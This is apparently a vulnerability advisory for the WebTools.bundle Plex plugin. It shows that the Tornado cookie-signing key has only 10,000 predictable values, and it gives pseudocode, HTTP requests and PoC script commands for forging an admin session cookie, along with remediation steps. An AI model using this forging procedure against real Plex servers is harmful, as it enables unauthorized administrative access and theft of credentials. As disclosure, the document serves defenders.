# WebTools.bundle — Predictable Tornado session signing key leads to unauthenticated authentication bypass

## Metadata

- **Vendor / project:** `ukdtom`
- **Product:** `WebTools.bundle` (third-party web management plugin for Plex Media Server)
- **Affected versions:** `3.0.0` and all versions up to `master` (tested: `3.0.0`)
- **CWE:** CWE-330 (Use of Insufficiently Random Values), CWE-287 (Improper Authentication)
- **CVSS 4.0:** 9.3 Critical — `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- **CVSS 3.1:** 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Credit:** gucheNg
- **CVE:** pending

## Summary

WebTools.bundle exposes a web management interface built on the Tornado framework. The
Tornado `cookie_secret` used to sign session cookies is derived from predictable values, so
only **10,000** possible signing keys exist. Because the installed plugin version is disclosed
by the unauthenticated `/version` endpoint and the source code is public, an unauthenticated
remote attacker can enumerate the candidate keys offline, forge a valid signed session cookie,
and bypass authentication to obtain administrative access to the WebTools interface.

The implementation validates only the cookie **signature**, not the cookie **content**, so any
cookie content signed with a recovered secret is accepted as an authenticated session.

## Root cause

`Contents/Code/webSrv.py` builds the Tornado signing key from `SharedSecret` and the plugin
name `NAME`:

```python
# webSrv.py, start_tornado()
448:    myCookie = Hash.MD5(Dict['SharedSecret'] + NAME)
449:    login_url = BASEURL + '/login'
450:    settings = {"cookie_secret": "__" + myCookie + "__",
451:                "login_url": login_url}
```

`SharedSecret` is generated **once** and persisted in the plugin preferences:

```python
# consts.py, makeDefaultSettings()
377:        Dict['SharedSecret'] = VERSION + '.' + str(randint(0, 9999))
```

At the time `makeDefaultSettings()` runs, the module-level `VERSION` still holds its
placeholder value, because `makeDefaultSettings()` is called **before** `setConsts()` — and it
is `setConsts()` that reads the real version from the `VERSION` file:

```python
# consts.py, __init__ / init flow
344:        self.makeDefaultSettings()
345:        self.setConsts()
...
293:            versionFile = Core.storage.join_path(Core.bundle_path, 'VERSION')
294:            with io.open(versionFile, "rb") as version_file:
295:                VERSION = version_file.read().splitlines()[0]
...
# consts.py (module level)
19: VERSION = 'ERROR'          # placeholder, still in effect at line 377
```

The plugin name is the bundle directory name (without extension), i.e. `WebTools`:

```python
# consts.py, setConsts()
282:        NAME = os.path.splitext(BUNDLEDIRNAME)[0]
```

So the persisted secret is always:

```
SharedSecret  = "ERROR." + str(randint(0, 9999))          # 10,000 possibilities
cookie_secret = "__" + MD5(SharedSecret + "WebTools") + "__"
```

and session handling relies entirely on the signature:

```python
# webSrv.py
129:    def get_current_user(self):
130:        return self.get_secure_cookie(NAME)
...
330:    def allow(self):
331:        self.set_secure_cookie(NAME, Hash.MD5(
332:            Dict['SharedSecret'] + Dict['password']), expires_days=None)
```

## Proof of concept

Tornado cookies have the form `name=value|timestamp|signature`, where
`signature = HMAC-SHA1(cookie_secret, name + value + str(timestamp))`.

Because `cookie_secret` has only 10,000 candidates, the valid session cookie can be computed
offline:

```text
for i in 0..9999:
    secret = "__" + md5("ERROR." + str(i) + "WebTools") + "__"
    cookie = "WebTools=" + base64("1") + "|" + timestamp + "|" +
             HMAC_SHA1(secret, "WebTools" + base64("1") + str(timestamp))
    GET /api/v3/logs/list with Cookie: <cookie>
    # 302 /login  -> wrong secret
    # 200         -> valid session (authenticated)
```

Observed result: a single candidate in the `0..9999` range yields `HTTP 200`, i.e. the signing
key is recovered and a valid session cookie can be produced on demand by the PoC script.

> The concrete recovered `cookie_secret` and a working `Cookie` value are **deliberately not
> published here**: because the affected deployment is unpatched and the timestamp is not
> validated, a working cookie is an active credential. The PoC script recovers the value for a
> given instance at runtime.

Reference implementation: [`poc/webtools_cookie_forge.py`](poc/webtools_cookie_forge.py)

```bash
python poc/webtools_cookie_forge.py --base http://TARGET:33400
# faster parallel enumeration:
python poc/webtools_cookie_forge.py --base http://TARGET:33400 --threads 20
```

The script returns the recovered `cookie_secret`, a freshly signed `Cookie` header for the
current time, and Yakit-ready raw HTTP requests.

## Reproduction

1. Fingerprint (no authentication required):

   ```http
   GET /version HTTP/1.1
   Host: TARGET:33400
   ```

   Response contains the plugin version (`3.0.0`).

2. Enumerate `i = 0..9999`, build the cookie as above, and request a protected endpoint:

   ```http
   GET /api/v3/logs/list HTTP/1.1
   Host: TARGET:33400
   Cookie: WebTools=MQ==|<unix-ts>|<HMAC-SHA1>
   ```
   `302` to `/login` means the signature is wrong; `200` means the forged cookie is a valid
   authenticated session.

3. Use the same cookie to reach administrative endpoints (`/api/v3/logs/list`,
   `/api/v3/settings/getsettings`, `/api/v3/techinfo/getinfo`, the logs download endpoint, …).

4. Contrast — the same request **without** the cookie returns `302` to `/login`, confirming the
   `200` responses come from the forged session and not from a missing authorization check.

## Impact

An unauthenticated remote attacker obtains full administrative control of the WebTools
instance: reading/downloading server logs, reading arbitrary files (see advisory 2), writing
files to the server, server-side requests, and reading Plex server credentials. In practice this
is equivalent to control of the host running Plex Media Server.

## Remediation

1. Derive `cookie_secret` from a cryptographically secure random value generated once with
   `os.urandom` (e.g. 32 bytes) and persist it; never derive it from the version string, the
   time, or a small-range random number.
2. Validate the session cookie **content** server-side (or use an opaque server-side session
   id), instead of trusting any correctly signed value.
3. Because the project is no longer maintained, restrict the WebTools management port to a
   trusted network and/or place it behind an authenticating reverse proxy.
